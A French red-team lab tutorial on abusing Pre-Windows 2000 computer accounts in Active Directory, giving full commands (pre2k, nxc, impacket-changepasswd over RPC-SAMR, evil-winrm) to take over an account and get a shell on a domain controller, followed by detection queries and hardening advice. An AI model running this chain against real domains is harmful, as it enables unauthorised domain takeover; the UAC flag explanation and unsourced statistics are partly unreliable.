# Pre2K — Mauvaises Configurations Active Directory

## <mark style="color:red;">🏛️ Pre2K — Mauvaises Configurations Active Directory</mark>

> **Source** : [Hacking Articles — Abusing AD Weak Permission Pre2K Compatibility](https://www.hackingarticles.in/pre2k-active-directory-misconfigurations/)\
> **Traduit et enrichi en français** | Niveau : Red Team / OSCP+

***

### <mark style="color:blue;">1. Introduction & Contexte</mark>

**Pre2K** (abréviation de _"Pre-Windows 2000"_) désigne un ensemble de paramètres hérités présents dans les environnements Windows Active Directory, maintenus pour des raisons de **compatibilité avec les anciens systèmes**.

#### Pourquoi est-ce dangereux ?

Lorsqu'un compte ordinateur (_Computer Account_) est créé dans Active Directory avec l'option **"Pre-Windows 2000 compatible"** cochée, Windows lui attribue automatiquement un mot de passe **identique au nom de la machine, en minuscules**.

```
Nom machine : DEMO
Mot de passe par défaut : demo
```

> ⚠️ Si ce mot de passe par défaut n'est **jamais changé**, un attaquant peut prendre le contrôle du compte machine — et potentiellement du domaine entier.

***

### <mark style="color:blue;">2. Prévalence des Mauvaises Configurations Pre2K</mark>

Les statistiques confirment que ce vecteur d'attaque reste très répandu en entreprise :

| Statistique                                                                 | Valeur        |
| --------------------------------------------------------------------------- | ------------- |
| Organisations utilisant encore des systèmes Legacy avec compatibilité Pre2K | **40 – 60 %** |
| Environnements AD avec des comptes Pre2K orphelins mal configurés           | **30 – 40 %** |
| Entreprises sur des OS obsolètes avec configurations legacy                 | **57 %**      |
| Violations de données liées à des mauvaises configs Active Directory        | **\~30 %**    |

***

### <mark style="color:blue;">3. Concepts Théoriques Clés</mark>

#### <mark style="color:green;">3.1 Le Compte Ordinateur (Computer Account)</mark>

Dans Active Directory, chaque machine jointe au domaine possède un **compte machine** (suffixé par `$`).

```
Exemple : DEMO$
```

Ce compte dispose :

* d'un **SPN** (Service Principal Name)
* d'un **mot de passe** géré automatiquement (rotation toutes \~30 jours en conditions normales)
* de droits de s'authentifier sur le domaine via Kerberos/NTLM

#### <mark style="color:green;">3.2 L'option Pre-Windows 2000</mark>

Quand cette case est cochée lors de la création du compte :

```
☑  Assign this computer account as a pre-Windows 2000 computer
```

Windows applique une configuration spéciale :

* **UAC flag `0x1000` (WORKSTATION\_TRUST\_ACCOUNT)** + flag `0x0080` (= valeur UAC : **4128**)
* Mot de passe initial = **nom machine en minuscules**
* `LogonCount = 0` → le compte peut ne jamais avoir été utilisé normalement

#### <mark style="color:green;">3.3 Valeurs UAC importantes</mark>

| Valeur UAC      | Signification                                                            |
| --------------- | ------------------------------------------------------------------------ |
| `4096` (0x1000) | WORKSTATION\_TRUST\_ACCOUNT                                              |
| `32` (0x0020)   | PASSWD\_NOTREQD                                                          |
| `4128`          | Combinaison legacy Pre2K — pas de vérification classique du mot de passe |

> **`UAC 4128`** indique des paramètres legacy où le compte peut être authentifié sans les vérifications de sécurité habituelles.

#### <mark style="color:green;">3.4 L'erreur STATUS\_NOLOGON\_WORKSTATION\_TRUST\_ACCOUNT</mark>

```
[-] SMB: STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

Cette erreur signifie que le compte ordinateur :

* existe dans AD
* **n'a pas établi sa relation de confiance (trust) avec le DC**
* ou son mot de passe est désynchronisé

→ C'est paradoxalement une **confirmation que le compte existe** et qu'on peut **changer son mot de passe sans authentification préalable** via RPC-SAMR.

***

### <mark style="color:blue;">4. Mise en Place du Lab</mark>

#### Prérequis

| Composant           | Détail                                   |
| ------------------- | ---------------------------------------- |
| Serveur AD          | Windows Server 2019 (DC)                 |
| Domaine             | `ignite.local`                           |
| Utilisateur de test | `raj` / `Password@1`                     |
| Attaquant           | Kali Linux                               |
| Outils              | `pre2k`, `nxc`, `impacket`, `evil-winrm` |

#### Architecture réseau du lab

```
┌─────────────────────────────────────────────┐
│               Réseau du Lab                 │
│                                             │
│  ┌─────────────────────┐                    │
│  │  Windows Server 2019│                    │
│  │  DC: ignite.local   │  192.168.1.48      │
│  │  ┌───────────────┐  │                    │
│  │  │ Compte: raj   │  │                    │
│  │  │ Pass: Pass@1  │  │                    │
│  │  ├───────────────┤  │                    │
│  │  │ Compte: DEMO$ │  │  ← Pre2K activé   │
│  │  │ Pass: demo    │  │                    │
│  │  └───────────────┘  │                    │
│  └─────────────────────┘                    │
│                                             │
│  ┌──────────────────┐                       │
│  │   Kali Linux     │  192.168.1.X          │
│  │   (Attaquant)    │                       │
│  └──────────────────┘                       │
└─────────────────────────────────────────────┘
```

#### <mark style="color:green;">Création du compte machine Pre2K (côté DC)</mark>

1. Ouvrir **Active Directory Users and Computers (ADUC)**
2. Clic droit sur `Computers` → **New Computer**
3. Renseigner :
   * Computer Name : `demo`
   * Pre-Windows 2000 name : `DEMO`
4. ✅ **Cocher la case** : _"Assign this computer account as a pre-Windows 2000 computer"_
5. Vérifier que le compte `demo` apparaît dans `ignite.local`

> ⚠️ S'assurer que **SMB** et **WinRM** sont activés sur le DC.

***

### <mark style="color:blue;">5. Schéma d'Attaque Général</mark>

```
PHASE 1 — ACCÈS INITIAL
═══════════════════════
  Attaquant dispose de credentials valides du domaine
  (ex: raj / Password@1 — obtenu par phishing, spray, etc.)

         ┌──────────────────┐
         │   raj:Password@1 │
         │  (user standard) │
         └────────┬─────────┘
                  │
                  ▼
PHASE 2 — ÉNUMÉRATION PRE2K
═══════════════════════════
  Recherche de comptes ordinateurs avec flag Pre2K
  → Mot de passe = nom machine en minuscules

  ┌───────────────┐    LDAP    ┌──────────────────────┐
  │  Kali Linux   │ ─────────► │  DC: ignite.local    │
  │  pre2k / nxc  │ ◄───────── │  [DEMO$ trouvé !]    │
  └───────────────┘            └──────────────────────┘

         ┌─────────────────────────────┐
         │  DEMO$ → password: "demo"   │
         │  (nom machine en lowercase) │
         └─────────────────────────────┘
                  │
                  ▼
PHASE 3 — VALIDATION + CHANGEMENT DE MOT DE PASSE
══════════════════════════════════════════════════
  Test direct: STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
  → Compte existe mais trust non établi
  → Changer le mot de passe via impacket-changepasswd (RPC-SAMR)

  ┌──────────────────────────────────────────┐
  │  DEMO$ : demo  →  DEMO$ : Password@987   │
  └──────────────────────────────────────────┘
                  │
                  ▼
PHASE 4 — ACCÈS AU DOMAINE
══════════════════════════
  evil-winrm → shell sur le DC avec compte DEMO$
  
  ┌────────────────────────────────────────┐
  │  evil-winrm -i DC -u DEMO$ -p Pass@987 │
  │  whoami → ignite\demo$                 │
  │  → DOMAIN CONTROLLER COMPROMIS 🚨      │
  └────────────────────────────────────────┘
```

***

### <mark style="color:blue;">6. Énumération — Méthode 1 : pre2k</mark>

#### Installation

```bash
git clone https://github.com/garrettfoster13/pre2k.git
cd pre2k
ls
pipx install .
```

#### Utilisation (mode authentifié)

```bash
pre2k auth -u raj -p Password@1 -dc-ip 192.168.1.48 -d ignite.local
```

#### Ce que fait l'outil

```
pre2k effectue un "password spraying" ciblé :
─────────────────────────────────────────────
  Pour chaque compte ordinateur du domaine :
    1. Récupère le nom de la machine via LDAP
    2. Génère le mot de passe candidat = nom_en_minuscules
    3. Teste l'authentification Kerberos/NTLM
    4. Retourne les comptes vulnérables ✅
```

#### Résultat attendu

```
[+] DEMO$ : demo  ← Compte vulnérable détecté !
```

***

### <mark style="color:blue;">7. Énumération — Méthode 2 : nxc (NetExec)</mark>

#### Commande

```bash
nxc ldap 192.168.1.48 -u raj -p Password@1 -M pre2k
```

| Critère      | pre2k                | nxc (module pre2k) |
| ------------ | -------------------- | ------------------ |
| Protocole    | Kerberos / NTLM      | LDAP               |
| Mode         | Authentifié          | Authentifié        |
| Vitesse      | Rapide (spray ciblé) | Rapide             |
| Output       | Compte + password    | Compte flaggé      |
| Installation | `pipx install`       | Inclus dans nxc    |

***

### <mark style="color:blue;">8. Exploitation Complète</mark>

#### <mark style="color:green;">Étape 1 — Confirmer le mot de passe par défaut</mark>

```bash
nxc smb ignite.local -u DEMO$ -p demo
```

**Réponse attendue :**

```
[-] ignite.local\DEMO$:demo STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

> ✅ Cette erreur **confirme** que le compte existe et que le mot de passe est correct, mais qu'il n'a pas de trust relationship active.

#### <mark style="color:green;">Étape 2 — Changer le mot de passe via impacket</mark>

```bash
impacket-changepasswd ignite.local/DEMO$@192.168.1.48 -newpass 'Password@987' -p rpc-samr
```

**Pourquoi `-p rpc-samr` ?**

```
RPC-SAMR (Security Account Manager Remote Protocol) permet
de changer un mot de passe sans connaître l'ancien, lorsque
le compte n'a pas de trust établi avec le DC.
         ↓
Pas besoin du mot de passe actuel pour le changer !
```

#### <mark style="color:green;">Étape 3 — Connexion au DC via evil-winrm</mark>

```bash
evil-winrm -i 192.168.1.48 -u DEMO$ -p Password@987
```

**Dans le shell :**

```powershell
whoami
# → ignite\demo$
```

#### <mark style="color:green;">Résumé des commandes complètes</mark>

```bash
# 1. Installer pre2k
pipx install pre2k

# 2. Énumérer les comptes Pre2K vulnérables
pre2k auth -u raj -p Password@1 -dc-ip 192.168.1.48 -d ignite.local

# 3. Alternative avec nxc
nxc ldap 192.168.1.48 -u raj -p Password@1 -M pre2k

# 4. Vérifier le compte (attendre l'erreur NOLOGON)
nxc smb ignite.local -u DEMO$ -p demo

# 5. Changer le mot de passe
impacket-changepasswd ignite.local/DEMO$@192.168.1.48 -newpass 'Password@987' -p rpc-samr

# 6. Obtenir un shell sur le DC
evil-winrm -i 192.168.1.48 -u DEMO$ -p Password@987
```

***

### <mark style="color:blue;">9. Schéma de Flux d'Exploitation</mark>

```
  ATTAQUANT (Kali)                              DC (ignite.local)
  ════════════════                              ═════════════════

  [1] pre2k auth / nxc ldap
      ──────────────────────────── LDAP ──────────────────────►
                                                [Enumère les comptes]
      ◄───────────────────────────────────────────────────────
                              DEMO$ identifié (UAC=4128)

  [2] nxc smb DEMO$:demo
      ──────────────────────────── SMB ───────────────────────►
                                                [Vérifie le compte]
      ◄───────────────────────────────────────────────────────
              STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT ✅

  [3] impacket-changepasswd (RPC-SAMR)
      ──────────────────────── RPC/SAMR ──────────────────────►
                                                [Nouveau mdp accepté]
      ◄───────────────────────────────────────────────────────
                              Password changé → Password@987

  [4] evil-winrm DEMO$:Password@987
      ─────────────────────────── WinRM ──────────────────────►
                                                [Auth réussie]
      ◄───────────────────────────────────────────────────────
                              Shell interactif sur le DC 🚨
```

***

#### <mark style="color:blue;">Détecter les comptes Pre2K vulnérables (Blue Team)</mark>

```powershell
# PowerShell — Identifier les comptes avec UAC 4128
Get-ADComputer -Filter * -Properties userAccountControl |
  Where-Object { $_.userAccountControl -band 4128 } |
  Select-Object Name, userAccountControl, LogonCount

# Identifier les comptes avec LogonCount = 0
Get-ADComputer -Filter {logonCount -eq 0} -Properties logonCount |
  Select-Object Name, logonCount
```

```bash
# Depuis Linux avec ldapsearch
ldapsearch -x -H ldap://DC_IP -b "dc=ignite,dc=local" \
  -D "raj@ignite.local" -w Password@1 \
  "(userAccountControl=4128)" cn userAccountControl
```

#### <mark style="color:green;">Hardening AD — Points Clés</mark>

```
✅ RECOMMANDATIONS
══════════════════
  1. Activer "Require pre-authentication" sur tous les comptes
  2. Activer SMB Signing sur tous les contrôleurs de domaine
  3. Désactiver NTLMv1 via GPO
  4. Auditer régulièrement les comptes avec LogonCount = 0
  5. Forcer la rotation des mots de passe des comptes machines
  6. Monitorer les changements de mot de passe via RPC-SAMR
     → Event ID 4723 / 4724 dans les logs Windows
  7. Utiliser "Protected Users" security group pour comptes sensibles
```
